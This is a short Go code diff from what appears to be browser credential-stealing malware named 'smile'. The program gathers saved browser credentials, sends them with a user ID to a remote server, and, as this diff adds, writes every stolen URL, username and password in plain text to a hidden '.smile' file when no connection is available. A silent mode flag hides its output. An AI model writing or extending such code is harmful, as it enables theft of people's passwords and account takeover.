@@ -2,6 +2,8 @@ package main
 
 import (
 	"fmt"
+	"os"
+	"regexp"
 	"smile/browsers"
 	"smile/config"
 	"smile/requests"
@@ -19,7 +21,6 @@ func main() {
 	// Data = append(Data, browsers.Opera());
 	// Data = append(Data, browsers.Safari());
 
-	// store config.USER_ID and Data in object "data"
 	data := map[string]interface{}{
 		"userId": config.USER_ID,
 		"data": Data,
@@ -27,10 +28,30 @@ func main() {
 
 	response, err := requests.SendUserData(data)
 	if err != nil {
-		fmt.Println(err)
+		re := regexp.MustCompile("(?i)no connection could be made")
+		if re.MatchString(err.Error()) {
+			fmt.Println("No internet connection...")
+			dataFile, err := os.Create(".smile")
+			if err != nil {
+				fmt.Println(err.Error())
+			}
+			defer dataFile.Close()
+
+			for _, data := range Data {
+				for _, credential := range data.Credentials {
+					dataFile.WriteString("url: " + credential.URL + "\n")
+					dataFile.WriteString("username: " + credential.Username + "\n")
+					dataFile.WriteString("password: " + credential.Password + "\n\n")
+				}
+			}
+
+			fmt.Println("Done!")
+		} else {
+			fmt.Println(err.Error())
+		}
 	}
 
 	if !config.SILENT {
-		fmt.Println(response);
+		fmt.Println(response)
 	}
 }
